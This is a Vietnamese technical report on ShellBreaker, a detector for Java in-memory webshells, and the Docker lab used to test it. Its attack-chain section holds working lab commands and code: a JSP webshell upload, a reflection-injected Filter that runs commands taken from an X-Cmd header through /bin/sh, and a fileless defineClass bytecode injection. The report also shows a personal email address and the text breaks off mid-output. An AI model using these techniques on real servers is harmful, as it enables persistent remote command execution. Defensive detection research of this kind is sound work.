# Báo Cáo Kỹ Thuật: ShellBreaker + memshell-lab

> Phiên bản: 5.0 | Ngày: 2026-05-30 | Tác giả: LNQuynh1009

---

## Mục lục

1. [Tổng quan](#1-tổng-quan)
2. [Kiến trúc hệ thống](#2-kiến-trúc-hệ-thống)
3. [Giải thích từng file](#3-giải-thích-từng-file)
4. [Java Agent — Phase 3](#4-java-agent--phase-3)
5. [Tích hợp memshell-lab](#5-tích-hợp-memshell-lab)
6. [Attack chain demo](#6-attack-chain-demo)
7. [Kết quả thực nghiệm](#7-kết-quả-thực-nghiệm)
8. [Phân tích điểm mù của mô hình](#8-phân-tích-điểm-mù-của-mô-hình)
9. [Rule-based: so sánh với c0ny1](#9-rule-based-so-sánh-với-c0ny1)
10. [Hạn chế và hướng phát triển](#10-hạn-chế-và-hướng-phát-triển)

---

## 1. Tổng quan

ShellBreaker là công cụ phát hiện **Java memory webshell (fileless / in-memory webshell)** kết hợp phân tích tĩnh bytecode và Java Instrumentation API. Dự án bao gồm ba lớp phòng thủ:

| Lớp | Cơ chế | Bắt được gì |
|-----|--------|-------------|
| **ML + Rule (static)** | Phân tích file `.class` trên disk | JSP compile, WAR deploy |
| **File-watcher** | inotify trên Tomcat work dir | File-based webshell, JSP stub |
| **Java Agent (runtime)** | `ClassFileTransformer` hook mọi class load | Fileless inject vào JVM heap |

**Nền tảng lý thuyết:** Paper GAShellBreaker (Electronics, MDPI 2025) — phân tích opcode sequence thành bigram adjacency matrix 149×149, chuyển thành grayscale image, rồi phân loại bằng ResNet50. ShellBreaker triển khai đúng pipeline này và bổ sung rule-based layer lấy ý tưởng từ c0ny1/java-memshell-scanner, đồng thời triển khai Java Agent theo phong cách copagent (LandGrey).

**Điểm khác biệt cốt lõi so với scanner truyền thống:** Memory webshell tồn tại hoàn toàn trong JVM heap — không có file nào trên disk sau khi inject — khiến file-watcher và antivirus truyền thống hoàn toàn bị mù. ShellBreaker Java Agent chặn từng class khi JVM load bằng `ClassFileTransformer.transform()`, ngay cả khi class được define bằng `ClassLoader.defineClass()` mà không có file tương ứng.

**Sau khi tích hợp với memshell-lab**, hệ thống hoạt động như một SIEM mini hoàn chỉnh:

```
Tomcat (target với payload thật)
    ├── Java Agent (premain) → scan mọi class khi load → /extracted
    │       └── capture: thread_name, call_stack, codesource_url, trigger_hook
    ├── Java Agent (agentmain) → scan on-demand khi attach → /extracted
    ├── File-watcher (detector.py) → theo dõi work dir + /extracted
    ├── ShellBreaker detector → ML + rule scoring → verdict + forensic extras
    │       └── top_opcodes, top_bigrams, injection_type/subtype, boolean flags, javap_excerpt
    ├── detections.jsonl (forensic log đầy đủ)
    ├── Splunk (log và dashboard, index=shellbreaker)
    └── Email cảnh báo (CONFIRMED/HIGH)
```

---

## 2. Kiến trúc hệ thống

### 2.1 Hai luồng phát hiện

```
╔══════════════════════════════════════════════════════════════════╗
║                        Luồng 1: File-based                      ║
║                                                                  ║
║  JSP / WAR deploy                                                ║
║       │                                                          ║
║       ▼                                                          ║
║  Tomcat compile → .class trong work dir                          ║
║       │                                                          ║
║       ▼                                                          ║
║  inotify event → detector.py                                     ║
║       │                                                          ║
║       ▼                                                          ║
║  javap → opcode sequence → 149×149 matrix → ResNet50 + Rule      ║
╚══════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════╗
║                       Luồng 2: Fileless                         ║
║                                                                  ║
║  ClassLoader.defineClass() (qua deserialization / OGNL / RCE)   ║
║       │                                                          ║
║       ▼                                                          ║
║  JVM → ClassFileTransformer.transform() ← Java Agent hook        ║
║       │                                                          ║
║       ├── ASM parse bytecode (in-process, không subprocess)      ║
║       ├── Rule engine: interface + API + classloader heuristics   ║
║       ├── Score ≥ min_score → dump .class vào /extracted         ║
║       │                                                          ║
║       ▼                                                          ║
║  POST /agent-report → detector.py                                ║
║       │                                                          ║
║       ▼                                                          ║
║  ML trên extracted class → verdict kết hợp                      ║
╚══════════════════════════════════════════════════════════════════╝
```

### 2.2 Pipeline ML chi tiết (ResNet50 — v5.0)

```
File .class bytecode
         │
         ▼
  javap -c -p -verbose          ← disassemble JVM bytecode thành text
         │
         ▼
  Opcode sequence extraction    ← regex parse: "  12: invokevirtual"
  + Normalize short-form opcodes
    (iload_0..3 → iload, iconst_0..5 → iconst, v.v.)
         │
         ├─────────────────────────────────────┐
         ▼                                     ▼
  149×149 adjacency matrix             Rule-based check (song song)
  mat[i][j] = count(op_i → op_j)       [interface, API nguy hiểm,
  Normalize → grayscale PNG             classloader heuristics, scoring]
         │                                     │
  Resize 224×224 → 3-channel              rule_level, rule_hits
  ImageNet normalize                         │
         │                                     │
  ResNet50 (fine-tuned) → sigmoid            │
  → ml_score [0..1]                          │
         │                                     │
         └──────────────┬──────────────────────┘
                        ▼
         Combined verdict logic (rule-first)
                        │
         ┌──────────────┼──────────────┬──────────────┐
         ▼              ▼              ▼              ▼
     CONFIRMED        HIGH           MEDIUM         BENIGN
  (rule HIGH       (ML ≥ 0.85)   (ML ≥ 0.50 OR   (không có gì)
   alone)                          rule MEDIUM)
```

**Lý do rule-first thay vì "rule HIGH AND ML ≥ thr":**
Đánh giá trên held-out test (80 fileless + 463 benign_test): rule FPR = 0.000 → rule HIGH một mình hoàn toàn đáng tin cậy. ML recall fileless = 32.5% quá thấp để dùng làm gate. Sau khi đổi sang rule-first: 95% fileless được CONFIRMED, 0 FP.

### 2.3 Grayscale image representation

| Bước | Chi tiết |
|------|---------|
| Input | 149×149 bigram count matrix (uint32) |
| Normalize | `pixel = count / max_count × 255` (uint8) |
| Output PNG | 149×149 grayscale |
| ResNet50 input | Resize 224×224 → copy sang 3 channel → ImageNet normalize |
| Model head | `Linear(2048, 1)` + sigmoid |
| Training | Adam lr=0.001, batch=32, 20 epochs × 3 runs, Colab T4 |

---

## 3. Giải thích từng file

### 3.1 `scripts/01_collect_dataset.sh` — Thu thập dữ liệu thô

Clone các repo GitHub vào `dataset/webshell_src/` (java-memshell-generator, ysoserial, Godzilla, copagent…) và `dataset/benign_src/` (18 repo: Tomcat, Spring, Netty, Shiro, Struts, Hibernate…). Chạy một lần, không lặp lại trừ khi thêm nguồn mới.

### 3.2 `scripts/01b_collect_benign_test.sh` — Tải benign test từ Maven Central

Tải JAR từ các domain **chưa từng xuất hiện trong training** (Kafka, Log4j2, Apache POI, commons-math3, HttpClient5, Jedis, Lucene) để làm benign test set thực sự độc lập. Không được trộn vào training.

### 3.3 `scripts/02_compile_and_filter.py` — Compile và dedup benign

Biên dịch các file `.java` trong repo benign bằng `javac`, rồi:
- **MD5 dedup**: Loại bỏ file trùng lặp
- **Skip dirs**: Bỏ qua `test/`, `generated/`, `build/`

Output: `dataset/compiled/benign/*.class` — chỉ file unique.

### 3.4 `scripts/02b_categorize.py` — Phân loại webshell

Phân chia webshell thành 2 nhóm:
- **`webshell_file/`**: file-based webshell → dùng để train/val
- **`webshell_fileless/`**: memory/fileless webshell → **chỉ dùng để test**

Quyết định thiết kế quan trọng nhất: fileless webshell **không bao giờ được dùng trong training**. Kết quả Recall=1.000 (Hybrid) trên 82 mẫu fileless (9 loại injection vector) chứng minh model tổng quát hóa thật sự qua zero-shot generalization.

### 3.5 `scripts/02c_extract_benign_test.py` — Unpack benign test JARs

Giải nén `.class` từ JAR trong `dataset/benign_test_jars/` → `dataset/compiled/benign_test/`. Giới hạn 500 file, lọc file < 500B, skip inner class (`$`), MD5 dedup. 500 file benign_test này **không bao giờ xuất hiện trong training**.

### 3.6 `scripts/03_build_grayscale.py` — Xây dựng bigram matrix

Quy trình cho mỗi `.class`:

**Bước 1 — Disassemble:**
```bash
javap -c -p <file.class>
```
Parse output bằng regex `r"^\s+\d+:\s+([a-z][a-z0-9_]+)"`.

**Bước 2 — Normalize opcodes:**
```
iload_0, iload_1, iload_2, iload_3  →  iload
iconst_0..5, iconst_m1              →  iconst
astore_0..3                         →  astore
```
Sau normalize: 149 opcode canonical theo JVM Specification Chapter 6.

**Bước 3 — Build bigram matrix:**
```python
mat[vocab[ops[i]], vocab[ops[i+1]]] += 1
```
Ma trận 149×149 = 22,201 ô. Normalize tuyến tính (`/ max * 255`) thay vì log để giữ độ tương phản.

**Bước 4 — Lưu PNG + dataset.csv:**
- PNG 149×149 grayscale → dùng cho ResNet50 baseline (đã deprecated)
- `dataset.csv`: `path, label, type, class_name`
- `vocab.json`: 149 entries, cố định cho mọi run

**Size filter** (≥500B cho webshell): Loại bỏ stub/interface/annotation rỗng không có chức năng thực sự.

### 3.7 `scripts/04_train_resnet50.py` — Huấn luyện ResNet50 (CURRENT)

Triển khai đúng methodology paper GAShellBreaker. Cần GPU — chạy trên Colab T4.

**Training strategy:**
```python
EPOCHS     = 20
LR         = 1e-3      # Adam optimizer
BATCH_SIZE = 32
N_RUNS     = 3         # 3 runs độc lập, average metrics
# 80/20 stratified split per run (random seed = SEED + run)
```

**Model:**
```python
model = torchvision.models.resnet50(weights=IMAGENET1K_V1)
model.fc = nn.Linear(2048, 1)   # replace FC head
criterion = nn.BCEWithLogitsLoss()
scheduler = CosineAnnealingLR(optimizer, T_max=EPOCHS)
```

**Held-out fileless eval** sau mỗi run: scan toàn bộ `output/webshell_fileless/` + `output/benign_test/` PNGs.

**Output:** `output/model_best.pt` (best run by val F1), `output/training_report.json`, `output/training_curves.png`.

**Workflow:**
```bash
# 1. Build PNGs locally
.venv/bin/python scripts/03_build_grayscale.py
# 2. Zip + upload to Google Drive
zip -r output.zip output/webshell_file output/webshell_fileless output/benign output/benign_test output/vocab.json output/dataset.csv
# 3. Open notebooks/colab_train.ipynb → T4 GPU → run all cells (~20-40 min)
# 4. Download model_best.pt + training_report.json → output/
```

### 3.7b `scripts/04b_train_xgboost.py` — Legacy XGBoost (superseded)

Trainer cũ — XGBoost trên flat feature vector 22,360 dims. Vẫn giữ lại như fallback. Inference tự động dùng `model_best.pt` nếu tồn tại, fallback về `xgb_model.pkl`.

### 3.8 `scripts/05_inference_api.py` — Inference engine

**Hai chế độ:**
```bash
# CLI — scan một file, in kết quả màu ra terminal
.venv/bin/python scripts/05_inference_api.py /path/to/Suspicious.class

# Server — FastAPI, nhận file qua HTTP
.venv/bin/python scripts/05_inference_api.py
# → http://localhost:8080/docs
```

**Auto-detect model:**
```python
MODEL_PATH = model_best.pt  if model_best.pt exists  # ResNet50
           else xgb_model.pkl                         # XGBoost fallback
```

**Logic kết hợp (rule-first v2.0):**
```python
if rule_HIGH:                            → CONFIRMED   # Rule đủ mạnh, không cần ML
if ml_score >= 0.85:                     → HIGH         # ML rất tự tin
if ml_score >= threshold OR rule_MEDIUM: → MEDIUM       # Một trong hai cảnh báo
else:                                    → BENIGN
```

**Rule-based scoring (phiên bản mới nhất):**

| Signal | Score |
|--------|-------|
| Interface: Filter/Servlet/Valve/HandlerInterceptor/ClassFileTransformer | +3 |
| Interface: WebSocket/Netty ChannelHandler | +2 |
| Superclass: HttpServlet/ValveBase/UnicastRemoteObject | +3 |
| API: Runtime.exec / ProcessBuilder / defineClass / getRuntime | +3 |
| API: ScriptEngine.eval / GroovyClassLoader / JavaCompiler / BCEL / Javassist | +2 |
| API: Method.invoke / setAccessible / reflect.Proxy | +1~2 |
| API: RMI UnicastRemoteObject | +2 |
| Tool fingerprint: Godzilla / Behinder / AntSword strings | +4 |
| Tên class chứa: shell/cmd/exec/backdoor/evil/inject… | +2 |
| Tên class ngắn ≤3 ký tự (obfuscated) | +1 |
| Thiếu SourceFile attribute | +1 |
| score ≥ 6 → HIGH; score ≥ 2 → MEDIUM |

### 3.9 `scripts/06_visualize.py` — Visualization

Tạo 9 biểu đồ trong `output/figures/`:

| File | Nội dung |
|------|---------|
| `fig_confusion_matrices.png` | Confusion matrix (default và optimized threshold) |
| `fig_metrics_runs.png` | P/R/F1 qua 3 training runs |
| `fig_threshold_tradeoff.png` | Precision-Recall curve với threshold marker |
| `fig_model_comparison.png` | So sánh XGBoost vs ResNet50 baseline |
| `fig_mlhybrid_metrics.png` | So sánh ML-only vs Hybrid: P/R/F1 trên held-out test |
| `fig_mlhybrid_confusion.png` | Confusion matrix ML vs Hybrid cạnh nhau |
| `fig_roc_pr.png` | ROC curve + Precision-Recall curve trên held-out test |
| `fig_score_dist.png` | Phân phối ML score theo nhãn (webshell / benign) |
| `fig_fileless_types.png` | **Thành phần fileless test set theo loại memshell** (bar + pie) |

**Held-out test set:** 82 fileless webshell + 500 benign_test (chưa từng thấy trong training, 9 loại memshell). Đánh giá với threshold=0.50 (không dùng optimized threshold — calibrated trên validation set, không đáng tin cậy cross-domain).

---

## 4. Java Agent — Phase 3

### 4.1 Tổng quan

Java Agent là lớp phòng thủ cuối cùng — bắt webshell fileless ngay tại thời điểm JVM load class, trước khi class có cơ hội thực thi bất kỳ lệnh nào. Không có file `.class` nào trên disk thì file-watcher cũng bất lực; Java Agent thì không.

**Hai chế độ:**

| Chế độ | Kích hoạt | Tác dụng |
|--------|-----------|---------|
| **premain** | `-javaagent:shellbreaker-agent.jar=<args>` trong `JAVA_OPTS` | Theo dõi mọi class từ lúc JVM khởi động |
| **agentmain** | `./lab.sh agent-attach` (Attach API) | Attach động vào JVM đang chạy, scan lại toàn bộ class đã load |

agentmain đặc biệt quan trọng: bắt được **class đã inject trước khi agent được load**.

### 4.2 Cấu trúc code

```
agent/
├── pom.xml                           Maven fat JAR với manifest agent + ASM shaded
└── src/main/java/com/shellbreaker/
    ├── agent/
    │   ├── ShellBreakerAgent.java    premain + agentmain entry points
    │   ├── ClassScanner.java         ClassFileTransformer implementation
    │   └── AgentConfig.java          Parse agent args (key=value CSV)
    ├── rules/
    │   ├── RuleEngine.java           Score-based rule engine (mirrors Python side)
    │   ├── BytecodeVisitor.java      ASM ClassVisitor + MethodVisitor
    │   └── ScanResult.java           Result DTO: risk tier, score, rule hits
    ├── output/
    │   ├── ClassExtractor.java       Copagent-inspired: dump bytecode to disk
    │   └── Reporter.java             POST JSON detections to agent-report endpoint
    └── attach/
        └── AttachMain.java           CLI: attach agent to running JVM by PID
```

### 4.3 Luồng xử lý trong ClassScanner

```java
// ClassScanner implements ClassFileTransformer
public byte[] transform(ClassLoader loader, String className, ..., byte[] classfileBuffer) {

    // 1. Skip JDK / framework packages (java/, org/apache/, org/springframework/...)
    if (shouldSkip(className)) return null;

    // 2. Dedup: class + loader identity — tránh scan lại cùng class nhiều lần
    String key = className + "@" + System.identityHashCode(loader);
    if (!seen.add(key)) return null;

    // 3. ASM parse + rule engine
    ScanResult result = RuleEngine.scan(className, classfileBuffer, loader, protectionDomain);

    // 4. Nếu score >= minScore: capture context + dump bytecode + report
    if (result.getScore() >= cfg.getMinScore()) {
        // Forensic context tại thời điểm inject
        Thread t = Thread.currentThread();
        result.setThreadName(t.getName());          // thread đang load class
        result.setCallStack(captureStack(t));       // top 12 non-JDK frames
        result.setTriggerHook(ShellBreakerAgent.getTriggerHook()); // "premain"/"agentmain"

        // CodeSource URL — null = class được define từ RAM, không có file/JAR nào
        String csUrl = "null";
        if (protectionDomain != null && protectionDomain.getCodeSource() != null) {
            URL loc = protectionDomain.getCodeSource().getLocation();
            if (loc != null) csUrl = loc.toString();
        }
        result.setCodeSourceUrl(csUrl);

        String path = extractor.extract(className, classfileBuffer);   // /extracted/...
        result.setExtractedPath(path);
        reporter.report(result);   // POST JSON to /agent-report
    }

    return null;  // không bao giờ sửa bytecode — passive observer
}
```

### 4.4 BytecodeVisitor — ASM phân tích bytecode

`BytecodeVisitor extends ClassVisitor` thu thập các tín hiệu:

**Dangerous call table** (`Map<String, Set<String>>`):

| Owner | Method |
|-------|--------|
| `java/lang/Runtime` | `exec`, `getRuntime` |
| `java/lang/ProcessBuilder` | `<init>`, `start` |
| `java/lang/ClassLoader` | `defineClass` |
| `sun/misc/Unsafe` | `defineClass`, `defineAnonymousClass` |
| `java/lang/reflect/Method` | `invoke` |
| `java/lang/reflect/AccessibleObject` | `setAccessible` |
| `java/lang/Thread` | `getContextClassLoader`, `setContextClassLoader` |
| `java/net/URLClassLoader` | `<init>` |
| `javax/script/ScriptEngine` | `eval` |
| `groovy/lang/GroovyClassLoader` | `parseClass` |
| `javax/tools/JavaCompiler` | `getTask` |
| `org/apache/bcel/classfile/JavaClass` | `getBytes` |
| `javassist/ClassPool` | `makeClass` |
| `javassist/CtClass` | `toBytecode` |

`dangerCalls` là `LinkedHashSet<String>` để dedup: `Method.invoke` gọi 20 lần chỉ tính là 1 signal.

### 4.5 RuleEngine — Score-based detection

Mirrors hoàn toàn Python rule layer trong `05_inference_api.py`. Ngoài các interface/API checks, còn có **classloader heuristics** lấy cảm hứng từ copagent:

```java
// Chỉ chạy khi score > 0 — tránh noise từ class hợp lệ
if (loader != null && score > 0) {

    // Không có backing resource → class thuần RAM (fileless)
    URL resource = loader.getResource(className + ".class");
    if (resource == null) {
        rules.add("no_backing_file");
        score += 3;
    }

    // ClassLoader loại đặc biệt → khả năng generate bytecode động
    if (loaderName.contains("Groovy") || loaderName.contains("javassist") ...) {
        rules.add("dynamic_loader");
        score += 2;
    }
}

// Không có CodeSource → không load từ file/JAR
if (protectionDomain != null && score > 0) {
    CodeSource cs = protectionDomain.getCodeSource();
    if (cs == null || cs.getLocation() == null) {
        rules.add("no_code_source");
        score += 2;
    }
}
```

**Ví dụ scoring cho `com/evil/MemFilter` (fileless attack):**

| Rule | Score |
|------|-------|
| `iface:Filter` (implements `javax/servlet/Filter`) | +3 |
| `api:start` (ProcessBuilder.start) | +3 |
| `no_source_attr` (compile `-g:none`) | +1 |
| `no_backing_file` (defineClass, không có URL) | +3 |
| `no_code_source` (ProtectionDomain không có location) | +2 |
| **Tổng** | **12 → HIGH** |

### 4.6 ClassExtractor — Copagent-inspired dump

Khi agent phát hiện class đáng ngờ, bytecode được lưu ra disk để phân tích sau:

```
/extracted/com/evil/MemFilter_1748123456789.class
```

Giữ nguyên package structure để `javap` và decompiler có thể đọc được. Cấu trúc path: `<extractDir>/<package>/<ClassName>_<timestamp_ms>.class`.

### 4.7 Reporter — Gửi alert về detector

Reporter POST JSON về `http://shellbreaker:8081/agent-report` (v4.1 — forensic context đầy đủ):

```json
{
  "source":         "agent",
  "class_name":     "com/evil/MemFilter",
  "verdict":        "WEBSHELL",
  "tier":           "HIGH",
  "rule_score":     12,
  "rule_hits":      ["iface:Filter", "api:start", "no_source_attr", "no_backing_file", "no_code_source"],
  "class_loader":   "PayloadLoader@1a2b3c4d",
  "extracted_path": "/extracted/com/evil/MemFilter_1748123456789.class",
  "thread_name":    "http-nio-8080-exec-3",
  "trigger_hook":   "premain",
  "codesource_url": "null",
  "call_stack": [
    "com.lab.BytecodeInjectServlet.doPost(BytecodeInjectServlet.java:54)",
    "org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(...)",
    "..."
  ]
}
```

`detector.py` nhận event này, chạy ML trên file extracted nếu có, kết hợp rule score từ agent với ML score để ra verdict cuối. `codesource_url = "null"` là dấu hiệu mạnh nhất của fileless injection — class không load từ bất kỳ file hay JAR nào.

### 4.8 AttachMain — Attach động vào JVM

```bash
# List tất cả JVM đang chạy
java -jar shellbreaker-agent.jar --list

# Attach vào PID cụ thể
java -jar shellbreaker-agent.jar <pid> report_url=http://shellbreaker:8081/agent-report

# Attach vào JVM match pattern
java -jar shellbreaker-agent.jar --match tomcat report_url=http://shellbreaker:8081/agent-report
```

Dùng `com.sun.tools.attach.VirtualMachine.attach(pid)` — không cần restart JVM.

### 4.9 Maven build

```bash
cd agent
mvn package -q
# → target/shellbreaker-agent.jar  (~500KB, fat JAR)
```

**Vấn đề shade:** Tomcat bundled ASM có thể conflict với ASM của agent. Giải pháp: maven-shade-plugin relocate `org.objectweb.asm` → `com.shellbreaker.shaded.asm`. Code compile với package gốc, shade diễn ra sau khi compile.

**Manifest entries bắt buộc trong MANIFEST.MF:**
```
Premain-Class: com.shellbreaker.agent.ShellBreakerAgent
Agent-Class: com.shellbreaker.agent.ShellBreakerAgent
Can-Retransform-Classes: true
Can-Redefine-Classes: true
```

---

## 5. Tích hợp memshell-lab

### 5.1 Kiến trúc Docker lab

**Location:** `/home/quynh/memshell-lab/`

```
memshell-lab/
├── docker-compose.yml
├── lab.sh                              CLI wrapper
├── shellbreaker/
│   └── detector.py                     Detector service v2.2
├── app/src/main/java/com/lab/
│   ├── UploadServlet.java              Upload file (điểm xâm nhập ban đầu)
│   ├── InjectServlet.java              Inject Filter memshell qua reflection
│   ├── BytecodeInjectServlet.java      Fileless: nhận base64 class, defineClass trong RAM
│   └── CmdServlet.java                 Command execution
├── sb-agent/
│   └── shellbreaker-agent.jar          Java Agent JAR (copy từ agent/target/)
├── agent/
│   ├── shell.jsp                       JSP webshell (dùng trong file-based attack chain)
│   └── payload/com/evil/
│       ├── MemFilter.java              Source của fileless payload
│       └── MemFilter.class             Pre-compiled, gửi lên target qua HTTP
└── splunk/
    └── init-splunk.sh
```

**Containers:**

| Container | Image | Port | Vai trò |
|-----------|-------|------|---------|
| `memshell-tomcat` | Tomcat 9 + lab app + Java Agent | 8080 | Target bị tấn công |
| `memshell-splunk` | Splunk Enterprise 9.2.1 | 8000 | SIEM, log dashboard |
| `memshell-shellbreaker` | Python + model | 8081 | Detector + agent-report server |

**Volume mounts quan trọng:**
- `./sb-agent/shellbreaker-agent.jar` → `/agent/shellbreaker-agent.jar:ro` trong Tomcat
- `agent-extracted:/extracted` — shared giữa Tomcat và ShellBreaker
- `./output/model_best.pt` → `/model/model_best.pt:ro` (ResNet50 state dict, ~90MB)

**JAVA_OPTS của Tomcat:**
```
-javaagent:/agent/shellbreaker-agent.jar=report_url=http://shellbreaker:8081/agent-report,extract_dir=/extracted,min_score=2
```

### 5.2 `shellbreaker/detector.py` — Detector service v2.3

**Hai nhiệm vụ song song:**

1. **File-watcher:** inotify trên `/watch/work` (Tomcat compiled JSPs) + `/extracted` (Java agent dumps)
2. **HTTP server:** lắng nghe `POST /agent-report` từ Java agent trên port 8081

```python
# File-watcher handler
def _handle(path):
    result = scan(path, model, vocab)          # ResNet50 + rule-check
    ops, javap_text = result.pop("_ops"), result.pop("_javap")  # internal data
    fx = _compute_forensics(ops, javap_text, ...)  # forensic extras
    event = { ...result, ...forensic_fields }  # merge vào event
    dispatch(event)

# Agent-report handler
def handle_agent_event(agent_event):
    # Lấy forensic context từ agent POST (thread_name, call_stack, codesource_url, trigger_hook)
    if agent_event.get("extracted_path"):
        result = scan(path, model, vocab)      # ResNet50 trên class đã dump
        fx = _compute_forensics(...)           # forensic extras từ ML scan
    event = { ...verdict, ...agent_context, ...forensic_fields }
    dispatch(event)
```

**`_compute_forensics()` trả về (v2.3):**
- `injection_type`: "Fileless (Java Agent heap interception)" / "File-based (Tomcat Jasper compiled JSP)"
- `injection_subtype`: "Servlet Filter", "Tomcat Valve", "Spring Interceptor"... (từ rule hits `iface:*`)
- `trigger_hook`: "premain" / "agentmain" / "Java Agent dump → file-watcher" / "Tomcat Jasper compiler → file-watcher"
- `has_runtime_exec`, `has_define_class`, `has_reflection`: boolean indicators
- `top_opcodes`: 10 opcode phổ biến nhất, dạng `"aload:89"`
- `top_bigrams`: 5 cặp opcode phổ biến nhất, dạng `"aload→invokevirtual:19"`
- `javap_excerpt`: 60 dòng đầu của `javap -c -p -verbose`

**Dedup bằng (path, size, mtime):** Tránh scan cùng file 2 lần khi Tomcat write nhiều chunks.

**Alerting pipeline:**
```
Mọi detection → log_to_file() → /logs/shellbreaker/detections.jsonl  (forensic fields đầy đủ)
              → send_splunk()  → HEC http://splunk:8088 (index=shellbreaker)
CONFIRMED/HIGH → send_email()  → jodielieberher@gmail.com qua Gmail SMTP
```

### 5.3 Splunk integration

**HEC Token:** `lab0000-0000-0000-0000-000000000001`

**Event format cho file-watcher detection (v2.3 — forensic fields đầy đủ):**
```json
{
  "event": {
    "verdict":          "CONFIRMED",
    "source":           "file-watcher",
    "filename":         "InjectServlet_1779873612418.class",
    "path":             "/extracted/com/lab/InjectServlet_1779873612418.class",
    "sha256":           "fe0f604...",
    "size_bytes":       7422,
    "ml_score":         0.3579,
    "rule_level":       "HIGH",
    "rule_hits":        ["iface:HttpServlet", "iface:Filter", "api:reflection_bypass", "tool:Memshell"],
    "has_runtime_exec": false,
    "has_define_class": false,
    "has_reflection":   true,
    "injection_type":   "Fileless (Java Agent bytecode dump)",
    "injection_subtype":"HTTP Servlet, Servlet Filter",
    "trigger_hook":     "Java Agent dump → file-watcher",
    "top_opcodes":      ["aload:89", "invokevirtual:54", "iconst:39", "ldc:37", "astore:24"],
    "top_bigrams":      ["aload→ldc:24", "aload→aload:20", "astore→aload:19"],
    "javap_excerpt":    "Classfile /extracted/com/lab/...\n  Last modified..."
  },
  "sourcetype": "shellbreaker",
  "index":      "shellbreaker"
}
```

**Event format cho Java agent detection (v2.3):**
```json
{
  "event": {
    "verdict":        "HIGH",
    "source":         "java-agent",
    "class_name":     "com/evil/MemFilter",
    "rule_score":     12,
    "rule_hits":      ["iface:Filter", "api:start", "no_backing_file", "no_code_source"],
    "class_loader":   "PayloadLoader@3a4b5c6d",
    "thread_name":    "http-nio-8080-exec-3",
    "trigger_hook":   "premain",
    "codesource_url": "null",
    "call_stack":     ["com.lab.BytecodeInjectServlet.doPost(...:54)", "..."]
  },
  "sourcetype": "shellbreaker",
  "index":      "shellbreaker"
}
```

**Splunk queries:**
```spl
index=shellbreaker | table _time verdict source filename ml_score rule_hits
index=shellbreaker verdict=CONFIRMED OR verdict=HIGH | sort -_time
index=shellbreaker source=java-agent | table _time verdict class_name rule_score rule_hits
```

---

## 6. Attack chain demo

### 6.1 File-based attack: shell.jsp → Filter memshell

**Đây là attack chain cổ điển.** Cả hai giai đoạn đều bị ShellBreaker bắt — kể cả sau khi JSP bị xóa khỏi disk.

```bash
cd /home/quynh/memshell-lab
./lab.sh up
./lab.sh attack
```

**Phase 1 — Upload JSP webshell:**
```bash
curl -F "file=@agent/shell.jsp" http://localhost:8080/app/upload
```

`UploadServlet.java` lưu file vào webroot không kiểm tra extension — intentional vulnerability.

Ngay khi Tomcat compile `shell.jsp` → tạo `shell_jsp.class` trong work dir → inotify event → detector scan → **MEDIUM/HIGH verdict** → Splunk + email.

**Phase 2 — JSP trigger inject Filter:**
```bash
curl "http://localhost:8080/app/shell.jsp?op=inject"
```

`InjectServlet.java` injection qua reflection:
1. Walk chain: `HttpServletRequest → RequestFacade → Request.getContext() → StandardContext`
2. Tạo anonymous `Filter` inline trong JVM heap:
   ```java
   Filter memshell = new Filter() {
       public void doFilter(ServletRequest req, ...) {
           String cmd = ((HttpServletRequest)req).getHeader("X-Cmd");
           if (cmd != null) {
               Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
               // trả về output
           }
       }
   };
   ```
3. Register: `FilterDef → FilterMap → addFilterMapBefore() → rebuild FilterChain cache`

**Phase 3 — Xóa JSP, memshell vẫn còn:**
```bash
curl -H "X-Cmd: rm -f .../shell.jsp" http://localhost:8080/app/index.jsp
```

Từ thời điểm này: **không có file nào trên disk**, nhưng mọi request có header `X-Cmd` đều được execute. File-watcher mù. **Java Agent (premain) vẫn đã bắt được** `InjectServlet.class` khi Tomcat load app:

```
[ShellBreaker] MEDIUM: com/lab/InjectServlet
  score=5  rules=[iface:Servlet, api:invoke, api:setAccessible, no_source_attr]
```

```bash
# Interactive shell
./lab.sh shell
tomcat-memshell$ id
uid=0(root) gid=0(root) ...
```

### 6.2 ShellBreaker bắt file-based webshell như thế nào

| Thời điểm | Event | Verdict |
|-----------|-------|---------|
| `shell.jsp` upload xong | Tomcat compile → `shell_jsp.class` | MEDIUM (ML: 0.72, rule: no_source) |
| App deploy | `InjectServlet.class` load vào JVM | MEDIUM (Agent: score=5) |
| Filter inject | Anonymous class define trong heap | **Không detect được bằng file-watcher** — đây là giới hạn của static scan |
| `shell.jsp` bị xóa | File-watcher thấy file biến mất | Log event, không re-scan |

File-watcher bắt được giai đoạn đầu. Anonymous class inject (Phase 2) vẫn bypass file-watcher — đó là lý do cần Java Agent với agentmain để scan live JVM heap.

---

### 6.3 Fileless attack: bytecode injection vào RAM

**Đây là attack thực sự fileless.** Không một byte nào được viết vào target disk ở bất kỳ thời điểm nào.

```bash
./lab.sh fileless-attack
```

**Kịch bản tấn công:**

Attacker đã compile `MemFilter.class` trên máy của mình (không bao giờ gửi source code). Class được base64-encode và POST lên target:

```bash
CLASS_B64=$(base64 -w0 agent/payload/com/evil/MemFilter.class)
curl -X POST http://localhost:8080/app/bytecode-inject \
    --data-urlencode "pass=lab456" \
    --data-urlencode "class_name=com.evil.MemFilter" \
    --data-urlencode "class_bytes=$CLASS_B64"
```

**`BytecodeInjectServlet` thực hiện:**
```java
// Inner ClassLoader expose protected defineClass
static class PayloadLoader extends ClassLoader {
    Class<?> define(String name, byte[] bytes) {
        return defineClass(name, bytes, 0, bytes.length);  // không ghi disk
    }
}

// POST handler:
byte[] classBytes = Base64.getDecoder().decode(bytesB64.trim());
PayloadLoader loader = new PayloadLoader(Thread.currentThread().getContextClassLoader());
Class<?> payloadClass = loader.define("com.evil.MemFilter", classBytes);
// → Tiếp theo: register làm Tomcat Filter qua reflection (giống InjectServlet)
```

`MemFilter` implements `javax.servlet.Filter`, dùng `ProcessBuilder` để exec command, trả về output qua `X-Cmd` header. Compile với `-g:none` → không có `SourceFile` attribute.

**Xác nhận không có file trên disk:**
```bash
docker exec memshell-tomcat find /usr/local/tomcat/work -name "MemFilter*" 2>/dev/null
# → (trống) — confirmed fileless
```

**ShellBreaker Java Agent bắt được:**

Java Agent premain đã hook `ClassFileTransformer`. Khi `PayloadLoader.define()` gọi `defineClass()`, JVM trigger `transform()` của agent:

```
[ShellBreaker] HIGH: com/evil/MemFilter
  score=12
